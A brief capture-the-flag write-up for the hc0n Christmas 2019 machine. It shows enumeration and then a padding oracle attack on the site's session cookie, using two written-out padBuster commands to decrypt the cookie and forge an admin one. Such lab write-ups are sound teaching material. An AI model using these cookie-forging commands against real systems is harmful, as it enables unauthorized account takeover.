# hc0n Christmas CTF - 2019

![](../../.gitbook/assets/41d0cdc8d99a8a3de2758ccbdf637a21.jpeg)

## Enumeration

I started **enumerating the machine using my tool** [**Legion**](https://github.com/carlospolop/legion):

![](<../../.gitbook/assets/image (244).png>)

There are 2 ports open: 80 (**HTTP**) and 22 (**SSH**)

In the web page you can **register new users**, and I noticed that **the length of the cookie depends on the length of the username** indicated:

![](<../../.gitbook/assets/image (245).png>)

![](<../../.gitbook/assets/image (246).png>)

And if you change some **byte** of the **cookie** you get this error:

![](<../../.gitbook/assets/image (247).png>)

With this information and[ **reading the padding oracle vulnerability**](../../cryptography/padding-oracle-priv.md) I was able to exploit it:

```bash
perl ./padBuster.pl http://10.10.231.5/index.php "GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" 8 -encoding 0 -cookies "hcon=GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy"
```

![](<../../.gitbook/assets/image (248).png>)

![](<../../.gitbook/assets/image (249).png>)

**Set user admin:**

```bash
perl ./padBuster.pl http://10.10.231.5/index.php "GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" 8 -encoding 0 -cookies "hcon=GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" -plaintext "user=admin"
```

![](<../../.gitbook/assets/image (250).png>)

